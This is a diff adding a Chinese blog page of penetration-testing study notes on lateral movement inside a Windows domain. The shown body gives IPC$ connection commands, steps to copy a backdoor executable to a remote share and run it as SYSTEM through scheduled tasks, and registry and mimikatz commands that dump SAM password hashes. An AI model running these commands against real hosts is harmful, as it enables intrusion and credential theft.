@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="这是第五章的学习记录汇总…  域内横向移动再内网攻击中被广泛使用，尤其是在APT 高级持续威胁。 攻击者利用横向移动，以被攻陷主机为跳板，访问其它域内主机 以扩大资产范围，包括包括跳板机器中的文档和存储的凭证、跳板机的数据库连接信息、域控及其它重要资产。  一、常用Windows远程连接（IPC$）和相关命令场景：已经获取到目标主机用户明文密码，网络环境较为苛刻，可以用Windows自带工具IPC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全学习笔记--Ⅴ：域内横向移动">
+<meta property="og:url" content="http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="这是第五章的学习记录汇总…  域内横向移动再内网攻击中被广泛使用，尤其是在APT 高级持续威胁。 攻击者利用横向移动，以被攻陷主机为跳板，访问其它域内主机 以扩大资产范围，包括包括跳板机器中的文档和存储的凭证、跳板机的数据库连接信息、域控及其它重要资产。  一、常用Windows远程连接（IPC$）和相关命令场景：已经获取到目标主机用户明文密码，网络环境较为苛刻，可以用Windows自带工具IPC">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210202194230744.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210205110806741.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210205151001780.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210220101907726.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210220104727240.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210220105510711.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210205151001780.png">
+<meta property="article:published_time" content="2021-02-02T07:23:37.000Z">
+<meta property="article:modified_time" content="2021-02-02T07:23:37.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="内网安全">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210202194230744.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>内网安全学习笔记--Ⅴ：域内横向移动</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/02/03/Apache-Druid-CVE-2021-25646%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/02/01/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&text=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&is_video=false&description=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习笔记--Ⅴ：域内横向移动&body=Check out this article: http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&name=内网安全学习笔记--Ⅴ：域内横向移动&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&t=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、常用Windows远程连接（IPC-）和相关命令"><span class="toc-number">1.</span> <span class="toc-text">一、常用Windows远程连接（IPC$）和相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法："><span class="toc-number">1.1.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件："><span class="toc-number">1.2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方法："><span class="toc-number">1.3.</span> <span class="toc-text">利用方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、Windows系统散列值获取"><span class="toc-number">2.</span> <span class="toc-text">二、Windows系统散列值获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件：-1"><span class="toc-number">2.1.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用工具及方法："><span class="toc-number">2.2.</span> <span class="toc-text">利用工具及方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1、GetPass获取明文密码"><span class="toc-number">2.2.1.</span> <span class="toc-text">1、GetPass获取明文密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2、PwDump7"><span class="toc-number">2.2.2.</span> <span class="toc-text">2、PwDump7</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3、Mimikatz"><span class="toc-number">2.2.3.</span> <span class="toc-text">3、Mimikatz</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用mimikatz在线读取SAM文件"><span class="toc-number">2.3.</span> <span class="toc-text">使用mimikatz在线读取SAM文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用mimikatz离线读取lsass-dmp文件"><span class="toc-number">2.4.</span> <span class="toc-text">使用mimikatz离线读取lsass.dmp文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用Powershell进行hash-dump"><span class="toc-number">2.5.</span> <span class="toc-text">使用Powershell进行hash dump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用MSF进行hash-dump"><span class="toc-number">2.6.</span> <span class="toc-text">使用MSF进行hash dump</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、哈希传递-Pass-the-Hash，PTH"><span class="toc-number">3.</span> <span class="toc-text">三、哈希传递(Pass-the-Hash，PTH)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用场景："><span class="toc-number">3.1.</span> <span class="toc-text">利用场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用NTLM-HASH进行哈希传递"><span class="toc-number">3.2.</span> <span class="toc-text">使用NTLM HASH进行哈希传递</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用ASE-256密钥进行哈希传递"><span class="toc-number">3.3.</span> <span class="toc-text">使用ASE-256密钥进行哈希传递</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、票据传递（Pass-the-Ticket，PTT）"><span class="toc-number">4.</span> <span class="toc-text">四、票据传递（Pass-the-Ticket，PTT）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#伪造黄金票据"><span class="toc-number">4.1.</span> <span class="toc-text">伪造黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#利用条件：-2"><span class="toc-number">4.1.1.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用方法：-1"><span class="toc-number">4.1.2.</span> <span class="toc-text">利用方法：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#伪造白银票据："><span class="toc-number">4.2.</span> <span class="toc-text">伪造白银票据：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#利用条件：-3"><span class="toc-number">4.2.1.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#可利用的服务列表："><span class="toc-number">4.2.2.</span> <span class="toc-text">可利用的服务列表：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用方法：-2"><span class="toc-number">4.2.3.</span> <span class="toc-text">利用方法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五、PsExec"><span class="toc-number">5.</span> <span class="toc-text">五、PsExec</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用注意："><span class="toc-number">5.1.</span> <span class="toc-text">使用注意：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法：-1"><span class="toc-number">5.2.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf的psexec模块"><span class="toc-number">5.3.</span> <span class="toc-text">msf的psexec模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#六、WMI"><span class="toc-number">6.</span> <span class="toc-text">六、WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法"><span class="toc-number">6.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#七、SMBexec"><span class="toc-number">7.</span> <span class="toc-text">七、SMBexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#八、DCOM在远程系统中的使用"><span class="toc-number">8.</span> <span class="toc-text">八、DCOM在远程系统中的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法：-2"><span class="toc-number">8.1.</span> <span class="toc-text">使用方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#获取DCOM程序列表"><span class="toc-number">8.1.1.</span> <span class="toc-text">获取DCOM程序列表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用DCOM执行任意命令"><span class="toc-number">8.1.2.</span> <span class="toc-text">使用DCOM执行任意命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用DCOM在远程目标执行命令"><span class="toc-number">8.1.3.</span> <span class="toc-text">使用DCOM在远程目标执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#九、SPN在域环境中的应用"><span class="toc-number">9.</span> <span class="toc-text">九、SPN在域环境中的应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SPN扫描"><span class="toc-number">9.1.</span> <span class="toc-text">SPN扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SPN命令格式"><span class="toc-number">9.1.1.</span> <span class="toc-text">SPN命令格式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#常见SPN服务"><span class="toc-number">9.1.2.</span> <span class="toc-text">常见SPN服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用powershell进行SPN扫描"><span class="toc-number">9.1.3.</span> <span class="toc-text">使用powershell进行SPN扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用Windows自带工具列出SPN信息"><span class="toc-number">9.1.4.</span> <span class="toc-text">使用Windows自带工具列出SPN信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberoast攻击"><span class="toc-number">9.2.</span> <span class="toc-text">Kerberoast攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#使用示例-破解mssql服务的票据："><span class="toc-number">9.2.1.</span> <span class="toc-text">使用示例-破解mssql服务的票据：</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网安全学习笔记--Ⅴ：域内横向移动
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-02T07:23:37.000Z" itemprop="datePublished">2021-02-02</time>
+        
+        (Updated: <time datetime="2021-02-02T07:23:37.000Z" itemprop="dateModified">2021-02-02</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag">内网安全</a>, <a class="tag-link" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="tag">横向移动</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这是第五章的学习记录汇总…</p>
+<blockquote>
+<p>域内横向移动再内网攻击中被广泛使用，尤其是在APT 高级持续威胁。</p>
+<p>攻击者利用横向移动，以被攻陷主机为跳板，访问其它域内主机 以扩大资产范围，包括包括跳板机器中的文档和存储的凭证、跳板机的数据库连接信息、域控及其它重要资产。</p>
+</blockquote>
+<h3 id="一、常用Windows远程连接（IPC-）和相关命令"><a href="#一、常用Windows远程连接（IPC-）和相关命令" class="headerlink" title="一、常用Windows远程连接（IPC$）和相关命令"></a>一、常用Windows远程连接（IPC$）和相关命令</h3><p>场景：已经获取到目标主机用户明文密码，网络环境较为苛刻，可以用Windows自带工具IPC建立远程连接。</p>
+<p>IPC（Internal Process Connection，空连接）共享“命名管道”资源，能够查看远程主机的共享资源。通过ipc可以与目标主机建立连接，从而访问、上传或下载目标主机的文件及运行其它命令。</p>
+<h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 建立一个连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\ipc$ /user:administrator "passwd"</span><br><span class="line"># 查看当前连接</span><br><span class="line"><span class="built_in">net</span> use</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210202194230744.png" alt="image-20210202194230744"></p>
+<p>IPC连接常见错误提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">错误号5：拒绝访问（本地权限问题）</span><br><span class="line">错误号51：无法找到网络路径（网络问题）</span><br><span class="line">错误号53：找不到网络路径（IP地址错误、目标未开机、目标有防火墙等）</span><br><span class="line">错误号67：找不到网络名（服务未启动、IPC$已被删除）</span><br><span class="line">错误号1219：提供的凭据与已存在的凭据冲突</span><br><span class="line">错误号1326：用户名或密码错误</span><br><span class="line">错误号1792：目标网络服务未启动，包括Netlogon服务未启动（连接域控可能会出现）</span><br><span class="line">错误号2242：密码已过期</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><p>开放了139、445端口；目标开启ipc$文件共享；已获取用户账号密码。</p>
+<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><p>可以使用以下命令</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 列出目标c盘目录</span><br><span class="line"><span class="built_in">dir</span>  \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\c$</span><br><span class="line"># 上传文件到目标主机</span><br><span class="line"><span class="built_in">copy</span> plugin_update.exe \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\c$\windows\temp\plugin_update.exe</span><br><span class="line"># 查看目标主机进程</span><br><span class="line">TASKLIST /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /U username /P password</span><br><span class="line"># 查看目标主机时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 创建计划任务，适用于<span class="number">2008</span>之前的系统</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> <span class="number">1</span>:<span class="number">00</span>PM C:\plugin_update.exe</span><br><span class="line"># 清楚任务记录</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> job_id /delete</span><br><span class="line"># 创建计划任务，适用于<span class="number">2008</span>以后的系统</span><br><span class="line">schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /RU System /u administrator /p "passwd"</span><br><span class="line"># 立即启动计划任务</span><br><span class="line">schtasks /run /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /u administrator /p "passwd"</span><br><span class="line"># 删除计划任务</span><br><span class="line">schtasks /F /delete /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /u administrator /p "passwd"</span><br></pre></td></tr></table></figure>
+
+<p>利用IPC上传后门并执行：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 首先建立连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\ipc$ /user:administrator "passwd"</span><br><span class="line"># 查看目标机器时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 创建计划任务，任务名 plugin_update</span><br><span class="line">schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">13</span>:<span class="number">00</span> /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /RU System</span><br><span class="line"># 也可以立即运行后门程序</span><br><span class="line">schtasks /run /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 删除创建的任务</span><br><span class="line">schtasks /F /delete /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 删除IPC</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /<span class="built_in">del</span> /y</span><br></pre></td></tr></table></figure>
+
+<h3 id="二、Windows系统散列值获取"><a href="#二、Windows系统散列值获取" class="headerlink" title="二、Windows系统散列值获取"></a>二、Windows系统散列值获取</h3><p>在Windows系统中通常使用两种方法对用户明文密码进行加密处理：LM HASH和NTLM HASH。</p>
+<p>LM HASH全名LAN Manager Hash，是微软为了提高Windows系统安全性而采用的散列加密算法，本质是DES加密，LM HASH较容易被破解，从Windows2008开始系统默认禁用LM HASH，如果被禁用，一般用工具抓取的LM HASH值为<code>aad3b435b51404eeaad3b435b51404ee</code>(代表空值或禁用)。</p>
+<p>MTLN HASH是微软为了提高安全性的同时保证兼容性而设计的加密算法，是基于MD4加密算法加密的。从Windows2003以后，Windows认证方式均为NTLM HASH。</p>
+<p>Windows hash结构<code>username:RID:LM-HASH:NT-HASH</code>。</p>
+<h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><p>System权限</p>
+<h4 id="利用工具及方法："><a href="#利用工具及方法：" class="headerlink" title="利用工具及方法："></a>利用工具及方法：</h4><h5 id="1、GetPass获取明文密码"><a href="#1、GetPass获取明文密码" class="headerlink" title="1、GetPass获取明文密码"></a>1、GetPass获取明文密码</h5><h5 id="2、PwDump7"><a href="#2、PwDump7" class="headerlink" title="2、PwDump7"></a>2、PwDump7</h5><p>可以获取系统所有账户的NTLM HASH，然后通过彩虹表破解hash或者用哈希传递的方法进行横向渗透</p>
+<h5 id="3、Mimikatz"><a href="#3、Mimikatz" class="headerlink" title="3、Mimikatz"></a>3、Mimikatz</h5><p>mimikatz是一款c语言编写的轻量级系统调试工具，该工具可以从内存中提取明文密码、散列值、PIN和Kerberos票据，也可以执行哈希传递、票据传递以及构建黄金票据（Golden Ticket）。</p>
+<p>通过SAM和SYSTEM文件抓取密码</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 方法<span class="number">1</span></span><br><span class="line"># 导出SAM和System文件</span><br><span class="line">reg save HKLM\SAM same.hive</span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br><span class="line"># 使用mimikatz读取sam、system文件</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">sam:sam</span>.<span class="title">hive</span> /<span class="title">system:system</span>.<span class="title">hive</span></span></span><br><span class="line"><span class="function"># 方法2 ：直接读取本地<span class="title">SAM</span>文件，导出<span class="title">HASH</span>信息</span></span><br><span class="line"><span class="function"># 提升权限</span></span><br><span class="line"><span class="function"><span class="title">privilege:debug</span></span></span><br><span class="line"><span class="function"><span class="title">token</span>::<span class="title">elevate</span></span></span><br><span class="line"><span class="function"># 读取本地<span class="title">SAM</span>获取<span class="title">NTLM</span> <span class="title">HASH</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">sam</span></span></span><br></pre></td></tr></table></figure>
+
